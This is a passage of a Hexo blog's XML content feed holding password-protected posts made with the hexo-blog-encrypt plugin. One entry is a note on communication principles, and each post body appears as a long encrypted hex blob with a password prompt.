c37634c4b3fdaf202725e7735790fba22eca4687936108a21ec9cc72d1c789dd482011096b45cd7786d2e94cd77d5403e1ec0a659ce03e85c4dd0b10b69d4a2f865eef19dbc660092c643cdf0ade2857c605e712d30289122e86b2ae75a21a3f48556160dcafca0c99b04f7008d493d4ad1e1de8ec7adc9cd84a8b514add4fb21f543141c2af5757b61b95705b0e6efad0ae410fbfba69e51442d7d34f91de02379d42f4f9128fb12371dff39091970eda64d1ecde2d1e59a296df27e63cfd6228dfa0034b36d38c1b1d21cf99da912ecac8bb889cc2bc47a4bd4714994fcd27ebd46845b49c6fa942813ad527d5b961a23ff14573dd65713b2a1ca08ebf4a6a9fbc74a3b2a0cf2c94bfaf40dab688ed737b95aacdb97466021f5de6404cc2afec55c93070b998acfa1807ded538bf3ab0ac702e29f59f0f4077048d538dc22dc151307dfe257d125222f8b7567c34d33115b6bba1663eb5c197173555f6aeb8f4358c7214a80701f4e1e9e03e01ea15decdc1e2c7e043b8af80317a0198f8331de5ed3c3005c7ba5383a059a0f11861120f88ae206d82b97bb4de1295707df81aa6b0013ca41eb103ded795c46ba98bddc5a0cb53560764bcc1e7fedf17d69b8ef838e75e905433b4fa82943e68e3abdd1697eed092c726c899747e678e640b905aed1b587d23c750ca35a75fa811ffc2988e1e1f1a6f17cf39b523810da0fe7f6a7ddca55f078d3b0b3f8df2d3b05a59a1f7efa2841b3c903cfdd30dc3610fd483676edf44254d16821123924d505a90ac0847f42b1ca886963b1c84684438c42b0bfedad60606ae5c549150610a8ffdc79d882beacc287ebab8723d32055dbc25520c340ffb627d832263db4ff2060224dcdd717a992c472ccebe29b66e6f3814a6c84bb9e43a05c547d533aa924a0c245bddeb36bf719c3190d8946d2778bb7bbd7de8c8acc476718760a290ce42b259e4cbe3bee94bcdfd3e9c40bef3f2bfc3781e3afd978d94ae5802be43f2abea7c95668fa26453620c3368624798d382e81fc7d5475b62be4ede9902b6faf5d954d58975ec90e830c6507628b2ecf6cec13b365c96eb358cd081f85b068169712ff46c782b2b791a1f45704d31a1f4ef97443b58e321a41255f620f1ffda037b923a30f20a798a34d1358b843b5dd53924566c563d5560940e38b9e1b8cd8300fdac984f95a230760617fa16958a54d85128e7d2387cea093ed651838c278dca90a465c1ceed092b6a96f4793ccf2fec122bfc48e0ec8f25ec548f0803b155167740b4d23bde7ebabf365ecd615d10e3e8c3c0a730a77c82ed281c283f222cfc257ef3b0c2a233f63b491d4d5d0f5dfdba8b1144e1892fd0543a8d78bfc0abd89401f1e0e88df710ae6e690a36b554e24f1318c9ef677f72ef2736dfaf306ab08acfb5d4ca082a48bd92737df3a09bbbc3354ad8e5f47cb6e91eaf6ef85cf18e765e6681a874c5bde135c5d78a284cc4910f6221beb8684062d8a76a3176f2df9a177e3e2c723e2f30a8214b63f10953a25c3e5a5507312c4dbb5899d7778a895d938b11eb90bf3286b57ccff2797501b0662e27bec097a6f15d515e1e5f3968eed7e0d3229e8a2da581b4e7bc9b22d6bce3aed0467d8f892b2e71710032ddebb89e1f4f1ca7dff1323f3f872c6fab6fd7a6b32a59c969bdfc00e5a694f3ceadf6ae928ffb79b9e333521f9d7d2de7fd5323d5f3c96d63e0f5000d3e6b254fae3028d9916fc521e154db0c6e3e5738162e4f633cd8681b1acac5c9cffbc3aa360e256a110cc8c65fd3b8a46dbc7fe73178f00a5b6529e1fc171f7a76b4268728909ff2acceb063fbc0277f963a7f4741ee472240fac33b1d18a5e597bbe958bf827c3c50cce245457b6b6b316f358aba5ca4f98f41e12500f74f0ec9c29392ede055f990c8de008abbae90d263b468032aa724010dbd36c1612084d630c43de4bcfa956afaf8bc8b40b58c71de83a0cb762173ec6893abfbd3c39690fb4ce68aab1ee4db0a2a006a41b3645b3988337162e6360bc0fc32995ab7f73097eacbad8aef9a0973fc6e9ee91fa1d1fe0377b1065ce086f87e6370cdd8a97fe0f54caf9fa28be7e1fe17e30b1382e9abb849ff8c82af430064973b5201dabf0a3b9d5f17b1e0ee4ddcf5179460bf3a45acce43691c7e845bbd4d0ae825040ea7ed4f4823d4f32de00520cf8c1a091a620ff6052908878fd8d19b22e6b1ebff89770cef3243a35661728ffc1275602c5ea0b3241805d6464eb0bedfd747bd5d15caf5ec078226fcfb5842ce6712a7b7aeff382674474f665e780a1a0ade502c1d138b2d10aa638ebc6c821de2f69dbd9bdfb7f30845cc21df18a1b117f0da16a529f245de06db67f3168880990372b3b494515ee37d943bd818058bf8a81f9b15d430997982e2daec1fd81493c3c49af45c96fe3e7a0c94d10bcd1b83774e0e9ba82664453176e05f7c861d9cde55b73bb15c1c7dda5cdd9121949e98d354ca3079ae24ce6f0336421ee4e144bd97e7f25325ffaa256e4ccd00831026bddf4a96aeda063708450e7345cd54c663cebbde9e42730aec8d14d1e4704d7cce31a2d9d76449138fd86573f15979011c0a23d04e2cdf801d608be29c79965dee25f99689b1d887553680db9fb8afcdc0ad95856378697536d0d4912aa0b75158cdcb19238cf22f434ae721b32a9703a30ff4105754fa7cc41aadddb8cb491d92016430c900d56a67fa720f14de4e84666fac3fd80ace5e0e6d4e72fc2f86499f69520dd779fd5ea1c6a879464e6585a7edc5490512427fb1b1d80eac0aba2191cca8ab2c894e71d19f735f9ea17e75cfdf716eaed0698bf1f9b25bb42b2aa03f95a8e7b7866badaf4ed9457d291bd3f2ce1f4c932678fdc6d57c0bca773bdf506aa700516da4a3b73d31b2609e5d4f9dd71ec458a4714b07f8d2faa37ee350a38d4ed0600642c42c6952af96d97bc6d66fd19aa869fe6f99624d7969f3d9320f4706d28e0d6cd3af2e4509cbfa70f6ebc2fd5d8c30f44a6f7da78b72e4db1efa31335c2dac4ef30c9fc81765c715cc6319eaa48841833da365531a265c510b14ae596958434281b44e66d5ce98edfb35811cb1b3b8478be6fc0db3fd50ddc5eea9ee0b2b6c96d0a5ba5cf0dd7ac41d421faea59dd773c8c7828e98d29351706544f112e28bdaf4cf804a373b7273c5c23b8191174cbf91787e47770b94f7d99064f33556e9312e5818209a29df0b06a3929f8c94d104000b81a067e86bdb52c5a814fd92eaa1148bdec09f9d64cd4a4f04d2644b4ae97abaeb6ac1dd0ac00739b5d0fa8f744ccf13b190a914383c790742a4149bea006e06ecfb9aa28d0faae40a60669cd6bcbf8e608bd67b235d4dfa1df2057aefb3c75c84e387f30a3eb2d50b6f30ab7bd9b91609ea073011b8614fdf0669237061862f25a8e470f67cad70680889b3b28d3e088fda575240f93e8e4dab3b25a294ed75d038765bae695a82d69d498ee2ba96a1b48bf83ccddb2614a07461085ccaec59f7b2792bb42efca385937c767cdfb9accb807909189f965cdba7d2ade869121477951c2fbca6b3cd398c56f07f77ef8cd3b0eabf94947d0074617a38d56ecfaf2762104b783fc2bbb336189c4c5fe96bf15add433ba94848d40433f4e2523f5302cc0cf6f23bee0883c711ab35315a2608003803b5ca70b5498554f8c095381e8e444de7a89e2e72fa002bfe817529a722210ebf06ee882723607c51ac8fd6728024cfa9a3a9d1fda91c0f137e766f976605c7dbe79caaeb8f4675972289abc19b09535647e5245d3f0aa6832f177910843d4aade10446772ce612effa0528a2ffb477ba87b3ef467d9d0ba3247468a4db5e73b7b1b78f6b9608674996c434e9fe5191e6e7414841cc5da6b412fcf60656aa18e0ff5d61d19b3943465f47569af7aa21f683bd37222f820da44c99a4b9bcd9ee0925aba1d89a604c9f9e83f9b2b2b08e6e0bc96691e10b30fcf7c53e680161223700b7457c298a1a101ce2f5dda1032504dbd4c954b71642e93fadcfb0d12d776abcff7fd40f9b53dc21269932abf3b58913b618f91a4fecfab4a9abb1b919d1532aee3b1ffa712418040c396e3f093f55b5c3fc223db68ad564849174b1bae128fa7e33b07e6c56e5a38b62d72eb7cb7b595095b4eeae525a78984c6a641540338eca88cf95674ac1b01fb3dc7f8203db15b5e06b8eabb735de69de4ae083c093cfaae732aaa16db3af82aecae29714afd8fd9cdd1f496e4f4caafec012871657a6780a14c9f4bfdc9b62912c221fcfec17a40eacc1c0a016062a786de21265685728568fd473265d38370d2c0ddf734b9c2e0432989ee3beadb77a9c8ac65d7219fe7b28576297b7784afd30fcd2bd740846d11befbe5d275aa7170083434d9d641c6f69499680ed95e90bebdf0950cfd8e0d8cfac3275e403b433b48be2062745b6b45b8479709483b23ff5b1ec303a5c71c62feae9086759c63d719dc14b2d6461191158d5db235942069d6515324e2ddedb77c1d99b16120743c0e6150ffc200265e2c8d6a70a594b2abfe7eb63d628fdbf4e697e9af25c7b18752875f4597cb7a922b7a19da558df4ce32ba382858edc3d9652d98e26f61248e3772472f24748927c1ab88396c0e23593a73f071e8b925c193acd4b81d8ce12df8dfc6521e7f4d861b5f3fe81db8f454c26810ea37f3fcfbf408cc89cbc2d32d5abaa4ed23e1f75e7183181256e7dbfb81272798a67c9b691e0c590dc85e21d269aa5fa55ed334dae6ab7a62ba76aeabd6bb7a6bf2c6bcbaa6e7082779c6591d67e6c4ebd2330b5ac70b67cd14635332d68b518e880787f7233f5693a0715829bbe481a8b37ec14448ffda5bc384ffc99c07d42b6570c063c4bca3d08f07df1592152ed1241773d16d1607fe71222edaa2c957248a5e3ed0c9c9d3972696a0a47fb483fa0843370f463b01e84f197a9515575b4c32f25aac0e7f6251990221b3d5718c7b59e985cac86fb0c824e34f39c6ec34d344f639ae6f8dc248403e896ec6c678192cede0faef560f4c77c26ae9d99dd17f77b08c7d19947ad72bc2532118d4bb5b493813c95d813585730b300d42dce65439d50c382fce01278b9c55000f2de7355096e1fd58525e4be63ec9af093ebd7aac17e9139d5d0a640d5aedcb6587756ff5a9fea11906291db611cb448f139a975130b4d0e5f2d2378a7e15aa2a47db68472f3174f44049daa92c3b285ebc94ab432deb6cf34aba1ffb5469bc12c767ced169ed2afe8c642e7a7d2d8bdb66706f039ea0f5d95603969f246ff3e6a21925208c0980625415391457e24b4aa7d374b26ad904c65a2360ec220aa1419301050ab712b612e8ba3b4014d2e75f8cf27f5ba40caf138ac52e23c931168a3cbed231917906629aba4f9a5a4ff67449d7f83e6b26cffa77c50c65494133e759d9b6146477215bdc14d17a31b95e56b78d2a07621d848072cb61d4d052d9e0d4ab31b97e195cbde36dbef9f453bfe1d749e8619b4d5fe8b6e92b4c98ee953082b680ee8767809c583b6a2ec9cdcc398d8db86f3bb97a2e93cc9d1007a708c7bbe09fa7778ddf38a083f1d8f18f0542ec8076ab34b73e07389dd8ead68107e6f36049f31bb7ff46f8fba2e8a8c7c10ef7ffb5f1d999da8dc50dd16d61b2998be3969d2104970509bd147b50a5741802b4c2260542ad9901200befb80be9890b97968f0341c2375105a503f5ae22a1c34898d8e840d89118756df75de077b0d6626a78baf77ca45e97d33e01e6a65f5db599b05694742184757ade93449ffb309b716c13f390a3b9528b634de95b645eada009154a25b60a5f5cdde30b3473cbbe6a23a52c095e8ffcf2458a8f9da1100c9d4dc62f24c33d56b81676f086ad18c122dd909a0409779cded2ef9205b1b167b95c63f937579d7c7082c08bab3f3148502cd7b07d5f8088afd1a0496c251321b7816c7709286cd23e41fafb55bb491d1b3f604df65481fbf60c0a3d457fb5fd0943c99cb88606cbe6a8e09ff08531bc778ba363e21b4a7d76fde3bde3ec7882bedf1e5ef45d37d512177121899969d5b326ceda58c10b71af9b9340767b5f125b6517b4506b92af78a89bdd65a16eebcce1fa446e494842f3a86f71de021278e86d47320f09911910537b7d019a2182a5387f8158ac13e29f02cc5b7f6057d0e7cd622b90ddee82a0a4ebaf0ca54153645b9ed501c00ed7a7e65f4ca1fc76167177f94e75d2c64327f656caee030c280622c8d0620c1ac35aa680607a0bc60abbf6d5a52f41f393d8bcbdc8d84fad4b8361b85b4772068b7eb70543e72fe7ae545bf1a307247c58eede2c8b8b59227b4973f0a5e0750093d793365f30007f7f57a28baf39b22120ff49a382ce30c984950858d61566876a46e5fd8482aa92dd9e9f61289b65d6c995db30d73d62b6ff7dbba212d1939b7aaa5ec749a5bf6b991451178aa5be4438ce1f80ca2753bf3593a1b0f6a4adfdbdbc4234cc0669e95bd3edb25686ed5ffb5bbbf7b0521e7be858b674ca2263a66cbd3ec461b87b1e330c75b72ef51729397e1ba306a1d729dd787c26497cc3bec64e79582e045e51dbf1dd9de7124c765ce763921dc2dab240fb7d713911669b73e28b9528b5e15aee96a63eb1ed5baff3acf8fa6db6f9ae5f941a8438b93ab73df317bdba56212282e9ef67134d3f8e402a43719c1013bd32beddfa9b604cd5b23fb8ce82ef6f646f103f093e34ef736ee4af8ed3ba98916c06a9886dbd4c9f3e5edcc73b1f0d38917b357c1360790e3c386985b11be06e48fea0ef81cdd68cfcecbcbc848b8bc8521bdfc9d6d4e983de16ac1e63ec5382ba75932e80177e2c05368dfb03045d56a81e991554b29f601cb7257e2658ebf450377fa7e5f9be68a858eb436545c0be1ed0ef4cb4c53dabd40ddc935d051a463e0c47a96f0090ee161f5f80d7b974d98c82903025c19f592873f245682a8bed2bc17e6c3b5fb8c567b2e8ba2653ed80c838ac09c4a4e79db6ea7e488b70679f124322100d5a9381188b365dabe175e43ee32483b71844b176ffd9c33d45fbf949188185630ce423734a7ccad46476e5cb12d59f5ddf6c3ebb3c64cfbc42e2048b877e08046eec027ac3e8b1d0657496ea3d643426cf5bb0a14fc64fc14c300311c9753c8d438892531dbcc207cc226ab64a9a134a5c5b5dd522402eadbae363ee099ddb44c1c032ee3c907b29af44c1906a1aead538fbc640f5e32fa4a44f6899061acd5496c4730356b199fb0222a2c9aa28e2ae1f1f642a023da7119370f3cd36ed3a3b91a74fb0596fddcc95e88548853b585e6d75f49c06d7b7bcf35fecfe0bb9fad32b35b83419e8718edaf25670a4503a3c4e06265db9cb6005f506ebb18130f796dabcd324921938ee0852d6a426d33c6eb6fc4a4408841dde79c1055857a1fdfe0881f9725938de8f6e44defa92a1cd1b95d68ee572a20a1d2334e88c3b0581bcbd52e22359b1be08ef36896de4d4dfc1af77d21022f4800e19b638201e0751c0a9c31ce5826c43fb00c27688344f0f0f340fff584648019e1a2f2b62b122577ab36b980792653a27e83ad52dab020b062b64477958e1a6558b6c7666660d8684d79ebf1f9e66aea80ac9d0697a2fbf5d950f4ba352848de4be561ddca00cc0a6e9654367d0fa7b298a7ea721fe0afc4ffa977d0c2c06aed5bb781d5fb96198aa16ccb48a262f0442827064a2ca17c45d9360a23e6c726a47574654998d2b92947291b27bbea9e3f311a5cb71eaf45ea2f54c2e8cb879ab15cb6ccf26f8bf67a55240ea7206ca997090287d983e4574377d50521266a37a0def799e231c608966506ff2ae9474947dba1a3f86592887e618317b48a15e4b142def5f78d4b7cc5f247e4a5630962ca50364825a8ce04875f1b372a12cf934814404a01326</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看~</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Work</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Work-通信原理</title>
    <url>/2025/08/10/Work-%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a3773b71289afc58dd29b29becfa3b4082b9b15fd2f2e43fe7092f3a0152c624">b9f6f7d1a88f5bde0575c28b3e79223ff494a86b30856a4a4a85a8cdb110ca219bdce43fb3110b2c92b06fd263f1fc4e8089c4abe49f5180a2e6f188865608e6a79886064520f51526cdf40dd3de6bd693ad4158adeb5259eaa34765359381708e93421388257d4aa3f99472c34cbf973ef054133a2e6e21b16e972d584463942f140bb4a3f20bdf6e5534983e42d76bc78965a22273591800af3f7a661960d4eb06cb87e44c8f5a4e11831f1254ff2825021afbfab5040f9e4a8cc5c23cf7fb254122a6f22d0cbd0af9a0f028966b77a62998c9b7ebb88f1029d56195a53b574fb9175f5054093949287be309c6a51155c6893996d26aed161770ce7a7a9d28f9c6b79316baa1ac961801ce68d92221d447b66a02803cb3e351b7f20e32734df22567942a1f15e4f6d6d24f4b69d1a42c39a5fd58ac1a1df8dad6f34ed689a85318582206acdf3536fd51a2c4ed1d5bfbe0b2a5a5ada194efb190fb4dcbaa35402c63a87139728d18f043d4d3b3a8ce6d04ce017ec679d317f844408ec0bea20e56b9bf3342dfba4ffef13d4ed91ede79671b571819ed6e66df3cc1ff2b6128a0ed353dc0bb880a72af55b94ccc67d3616d9659cb66060d6f6e8202187d02ab6d272e797b860a156452f6fb1d0a8e395dadcb444dfa17eadfe0022628f28ee982538a423547ada774c30c6a005cda9984df2559da7b6d6e05814e554d41340599a1596429b8efe5f9dc7607dd5cf677acaee9eaa51efaea0e2a554cf6da3478cc3e4c2699e29664e4838d063df3d49230f514f922b0dbbb42dc40e83737b11e7e1a641362b755cd4ab05a821c3266123e2029525c8df4cbdf0232c52269e713c00420bccbedbbddd08a5da6d0578e2f27076b938e833a2429f30566bc15e2ffaa1fade6719d0ccbd057697bee8a1997093802b86b2d58980998c4c706278079e2ce1cc193da91ec0d3bcb96d79bca9bf4e333ee1fb2ca10a9bbb619fe9d4305c4ad62c539b4fefc4bb42679f198bb9a8d30875c623312559aa81696f466699b52f904745118365513468ac6caba795f041be148898e142ee1439b95c6d97931b8a32ceeb94bdb39757b00e25cfd5b426f7355cb7c818891f3abd05968f514483e6cc08a3623596b865effc6ffcd2eccb930bf75b9f4941b384fba86e65423bbe7a42680fed0b36a61abfa2154c0f5c5b47002f8d3254a1083493281a6a3a8f9578d438fac33945c6e8e148b3d381082ab84b96000740f87cfcc674bfbd0170e0f2815df58a5a525ddcf8e636ebe7146f1ac2c537bb97737483f31063ea3cf70f7b11ba042c9f4bc7b28a24f0012b20884a38a56760f13dee74ad62373536c2f1c0a266d81dca5f8f85cedf6df8d76fb7e493e476f3c8fbced12d0ff787852bcfa6e157faf26ee399ebd101cdb4192d63dc7c2a2c98d1210ecc7380b027e830d8071c39be712e47b97d5caae1e06c1e9b92ae3b16d2a548db7bb0c8903ca86c84cbb2430d47d8ab4b912cfd295a14e80441cec3df86f7b7d356cb48394ce0b4362e606970fb99ed11f1d92c3a0cc113984df2ea364780b64c1b97884eb76f2d73da84fa564634b8fc2dd453b044e622c4014339709194863ef01de12e28a0371a611fa395c866cd2a2e68e57e0c44f427b85dc61355e0983386ae355fd1ac2e2ada90190501d3ef3784b16f2f7b335ed133d97dfb56dfea1e6b971918ef7a080b4b33d5d251117efdbf49f0bc65de7a17d60b036db4b8d1a4bd815e34f9ad6fbe8534811e8e4548918b42be06d77171a40072936b8dc86c9817be5f5348fb488309e03eaff55480069084a59738edd8f9c187e3ded15644f9f4ea222ea3bbd5eeaf8e4a28a53c6d26d8f51561f5d672f0ab6ef05c5fc620fd53987ace1a80a1578d4de97266d765b421d603675f2983731b171029263c623c38f1874d1065e67d67c130d3802aa0ecd71eccbceae8991a858c4a6360bb9f77d5af087a0f0569046f1b9acd2482c71d6dba73f3f86f295f11cb57aaf16ab2e8bead5107a16c01d403521f9d8d5c523e6222b5491103c59313868b55f2d4d2e51a0156c7f5346555cf3eb70b78c674e364d8716b804a14e7a742c9ca33ce6bd24dfd151035f3f09742d9e51d9ff2f704158e8fb73b945681b3b8563d1171c0167db11bfc903fd9906530b8d5c1bc318ffe265e46054ed2c7c3b605d5ac2e274dd73cc819dd1a14c0de42e7dbf113f93fc90a6d0f81b89e7df94cc57843fa614f76af4b9b058c0370247509e90cb81f9eb9ba3d29d7d3657fe3bcbc16a9396d85ae90fd1d3887bd91fff50ed6f7e49fd4bae10ae0f37641e7c7c9400bf16abe46f064099ea6acf5561da1a5f7c14f020c2b60c33d4d084a7cabeea3ebcbab0d2699743de1c3ceb05a5e4d15cae7a8775ac495f0b5c19822d004c36387edf2136b14f0d6a0487e6ba597fdf896626ce520882d928d20cf3475a92daf37b92b6bbbef766ed4fb48f8b27513ce4521d0d94792cbf62e0441136b11f8f86841d8fa1ba8452f9e7477c7d8cb83381e613e05803d6d63fbd85fe998293d1ea9eab44b3958442699e0e70726f10fd5a3bf2e30d300562a604f914fb420e5b1a0f9b451a4b73fa38703e92404189453fabaf22ee4466d76a89a2e5d7b3915dd84dfb31f0be0dd9f43e14daa478c4debef35204c285e0450265ba2e94924b5bbc0b655629579b99fe45ed9a1d947f38151101e03b5ac6e6deaac2516c2ca79ce76f09a367f873a09417189f82d0c7a0af1df9697804006734360a57b333751e9ff6c5d5b3425fe09359be1347b5727713536e18d69faf6efad634d8100b7b6d465088c4606071022d7e0d8f86e0f132781d35b6e881e5b52c6bdb2eaa2ae424aef5ab4b80c333e63ace5e82f7082128bcd8d3bad7da327694290a18d6b2c7c7c34630b9e622cfbc5e2ec4691b508fddbf4fdeb60103f6a05d25cd7262ecfdb22924dc2d93b2bfd1d690cac24fb311c66cecb0ee8161276326694ab1562da7d35a6da2f45ffc8dc83b4445ce3ff7129b30d22f39d70299fcddbb885495d6e960a246eb1a0f556e99cf8010ac632385d99d0e9ddcb5a1f0711a63e2859b31691bb6694da537ce06a645ffe04408ce022e620cc656e6d365f4d2da67b68b04d73d4cb0e88e6ef57895e338a3d37eeec2238da345b136b5920defce5dcea53920a00f977bc19f92e6cda83dc6d971fdd9a4d089425513d88e4ba9cbbfd9bc74dedb7f52b809f20d0c859006e2a5f7a968d0676ad86ff2a8ac688722e2e0aec0bf8018296bd9f20ed00edbd7f6bfb6abbb80632fc9e381d69d9418b01d97c42f4a971b560a77a14045c56143fe63421c6846dfbb8d3d940f3a93676862ea4b25bb2ad4475617803687eaf4fcc13ce5b2b1045265b38b2babba20a9b993c2feec702909783ea8e0260a0d6582c7e54168709d9911336900654ee4ae9b2f27e5e44cea27c5525594b8d8879c68f8b22f3cab398f791a8c65b8e6c120fe7122c3d30cbeb4e1cc70a98fdac9c7f2505d5e062e97089f0ca7db66405717dee3525eff05deee595b71528b0131d0e80db8f83c531d4958e6239947861a6bcc5e9ef103cf8f352106ae7e8ebe8b24d5e6e492f944ef572e9d643a30e8acbeec9112307e0d678e8e01c2446123781dd5eb70eeb3ffd951677a1b56324997bebfeb6eace686c890b3c289cdf86a1239ce0a937a9f6768d5f54b7426d98d5738c4cfedc6d4dd2223c1b6af8d6b34aa8b52c86a78549c0d0997483b15045f9bf9731a32b0e28d490cf045646d6ef1300ecbe493ecdbcd2c4735992b573a265346f1dd1237e013485af7819ff274028329fdb4175e6c04e66630269ed1b2e28afe953232e43ffd75196c3d87b0c1ce97bf7af35db1a40a232cb15a15e17cdc864799d645ac435d2eabd0282ed3131f41959c55482a22b39681d4d03f59461a6991ad67a6bfbc9c538328824769cad95a5cb95e9dd0c0815e1166e7eb13663c7aa89dca892a561f9250179e469742b881c0b1f30c3bfeac2039271f66f5774e548b9ff0b1869724f3ad0d5a46fce038f448122824b61168a7e05e976240134ee42835a36c275ab882c40752be51b47361b2b1240adefbf9982e23ab27e23d86212bf1a77af9b5f5f42fbe3c905a67b4f14725b907fd72f713c76423d79bc9daf75422a8f6e9bb859f31ed6a2bf1eeb33e75fcac1a5e5c26260f452757596e8207c9a604c33c6c45fa490d61751307a869f158aafa40f072bb0a29ec4fd6c0a5999d37e23263c54b4d8dd1ec98c7eef8bb8d1245b9fbcc91d2f0b4cbd8c1f3ef4a01a028ca6a16c8d82f05dc5bf264fed84e815cd2e61697c993b9dac0d154fd9d26fecbd32bd3a62fab2da0df1b1b6921bbb78f36c27de8d441d5f855dcb0cac098e2f4b16bc106533c32775fd791e50a40a090520bf44a6e14505726c6df27f3177e464645da8097efa556eb6103164bb08df106887a6420614a21d9a54757572db5ea7ccf116c4f63f449e02af618b973bc7cd4428a6cea8dfe5f920209b2914d387b7a53af33086bdc35a65843e17a78231e0cf1efb1288656161b197e1fbb29b582383d7781f3f69d9eeb1e6d82adba27ea9a00738e6d04a42ccf2cfdba713ce59bc32f8ee1e94ee33ad0c0dd58cbb2502e5677036ab09d347ce18d0a5df2bdf2a1fa4c97fb3dec7e60470886813fee0c897e6f535bffba6150377d406c15e3c9ca03d6289b7ae4ad44afb38e0d96fa008434286e7f664601426562e89bf378161cae400f5ed1b7e69146b6ed7731f342cdbe9f504122258d2f5107d8a8ba75721f0bfaf84471a945840c4baa87947bff89ced1ee5d6b2e747fadb248eea91d065070ca8caacd1ad01d06635badc96740050520a55b2e91661aaa1147993b6bf3a092afe01e02f4e6eb64100be19a0326f93b3053a7ac7533fc085d716efbfc1f582a359be5e8bae93a92c9c701efd9001d1dc4d5a578dfc12c7e582ea6bafe1d661d46665fbc9a600cec4b1e74e490a7e3e0c56612af783b5a38b091178dc722ff1f32ba52d7464560cab467256cbe0d07f52e6c5c193917f5a0249650a443b006e88f495c482423756090b22a962eebfff82ccf642bce20384f6d8271160ba6ec38ac128e064b22a6379985ac9bbf07d48803b1c4a715b9fffe2fc455846d906c78fe41710136bac3745a4d29aceb47edac499338c48c551c47b49948a58f063eb17451aa39785b5de0d4e91e8cee4b17a60bd9ac1203f73604798121e3ef774849df5391435d80cce65cd31002707e1efd50b3f25005d34e94d63e8619f4001027dfadd3792c6e60e67386ea224f3474fad88c34b7ec6854e3ff8c7b20d2d6bdbeaa767a9b36f8fa89e5f3259dde984df8d39b6fc13666c183d9586209fd18a7c337b7f6720772985e0c4aa2404728a5bd06876ba568df23b1816c28a72f18905c1ddf280ed3e7341b8e6ad9bd0088c485c32074795a169d94aaa2b086627ffed80cf6fd10e7d9fc51c6dd91b5ac78bb9b9c12b72a290ef28cb173bba5c937db364b2e346f6643a1e0e6214962c0b0073a58c01531434abb42122eacf003ea95b07d913954f331e6821ee37c0a5b076c30386ca9b349c8989c05a741ffe60f9b455903abd6e255a09f56c90bf737e698ee534336f4134f6089841211a888aeb947f8b76a67fe3a62c348c4280f11f14395375b64bb52e20efb40245524542125c37ac620f9c7f6b77ffd319ea5a4a75ca9a378fc2e2f98491aae8ab24df9fcb12007ba66b39a170c91c10edc7d39479f8f93315c730a6d86eb034fee46567cb0bb34c30cee91994866a8b21cc8ff423dba8aae53298f27d80a56a2c601fcb68245ef5c7212c0b5a5c5919d30da1280a7941852f2321eca310bcf547d3e570920c2d2164ac1b70c5842d15c24aa5ccd1328124f6099270c2302d805b19f80dc8cbc2684e5b47628db9a358423ae48fb76355a0b14e0d5c6aa6b63d45e53b5cc4b8f802e51eec2826183b870c10a2f7a4c44da0afbd86f5606cf084e7705182c349e2d4e002c65423f26cb9ca894b7da707d7bd1ce5e535fb6caf1b92e7f7c4f4343f8d624847f9747c25e5550816b7ae172cd9049a56a9e34ebbbc246bc685a83a9a797844fade0c74ec08674069b5fda57ee7c880040c89f90a93b48d31a86e4c142aef8fb8d3424396220e21e95ff2c207bcffa98d4c56919274946ba0f387395daee1cade7a74753dfc439f6a210b76c90a2caf00eb18b64563fa18b112e826ee442d47e933c7acbd212f42e25f731c58c36bb6654a25f6fa0f44d1c153f45df8faffc9156b2cca5981a245994b71dd8d476e1d454be0f84ea0dcaacf69ae8cf96674f98887697ba05c301b4850e57bcf3773d4cc12fab922bae1966757e4296c0cd33b6c4677bc9e097f2aef90525621c09f3b5325d485c44088ef90ffcf68e1c221fd6973e3cd02c57afbfcb99f17af375c3f085abd0a58ce70d1d9eb14949485e2ba9f206eea62e348f4f56ac4ea6bd6b71a1b14cdbc1b8d7b1bf12ec66ef90fa5d282c5fcf3f5cf9f2244c3814a499f0b6b8b2550d19fe07ed2ebb65f71b68b32acf78a3314b3c9893897240f0a108d5699300f99b49e0ea3f59c0ddfa45be9ec37993fda0f7d3e3b90600cff198939757572ebda71188a12dd5b00e5d5664bc556b8773afcf0e4c881f7dd98fe8bcbab8a209daf301581a031c34416ef61a0fb76bfcb2214d484c43281f2853c33c109b14d210a642abfa3c6053dba343c4f30f45124f5d9edbf6af66af728cd25a686253de1427a9246ee24c589ae25a565d7a66e07a4917ff6c3b28ba554e2ddac78eea62087b176a652fb1f44841ec048ce1db8cde13e92d28222b6a8e4a738942a513056a2eb315dfa98eba0b6a1d555915ec403b0deec239867fc6c4bd8894a28fd170f19e1b43ba3df30db308d0c482217a989cd34f9d1c98382cca62e1c074743225fd201392d3c81422fc017ea186bff17a2d5e8e54f7788c7e5632b2c1fd08c51feaefeb8d8bb66e85a7b7e4894cfab10ffa66cb6b4b088386565cbba1a32bb4479b66e2e347e99ec1f3fbca7194089f469509f235daceed778a0bb986b5c85ae4eaf84393db0ac3c4c393895c4d022817d1a3d0ca5ab889968eafffa84c8d068740ce6d1b8c899b139b6cbad007468ce221085ddb7f1b8255611061950024f59ab5970ba87f2fa2aaade160606ff62bac277a786171d79a14c14457f3e92590b74c5b35c4a4643e18ac967c6ce289d08d6ea588c91fb24559e0317f55adc63d3671d719f70693d27bc5005766c4ee71eb98222b0015a1d5c517f832a9c915642898746ced2a7bf6e3da47babaed1bb14a077f4e8ed323e282a51041889ac4c1c2a8b7ecbd9091983e51fcb9c4f67d2ef4c4c8327ffb699bef0c1b0d908f33bc68f78a2de19ac51cb0009398759b97972fa7053e99d6b5fd43f948d5f1ce6ad7e4d51d006794686270e7a0ac46e0e576bf4dc596290e525d5937059ae713554d434d17a922e59cbaffd38650672e2a648e1d1383ecca489dcc480320dc474cf9a892fda2978bd69cd90d193ecc731f8c48efc45949d54e87e7d3c5326f0b14453bda3bd48f20175173b7cfbb33150caf5ad6af8704a77cab3b28fe5c032e496afda13ebef4338f52de1cf47ee9e53f54a64e5c491af72dc19faf209160cf4acc58a5a1fe88b8a789952333e2030d48e6a58c15698fdad391d746a2ebe4a2cf062464de4caf28906028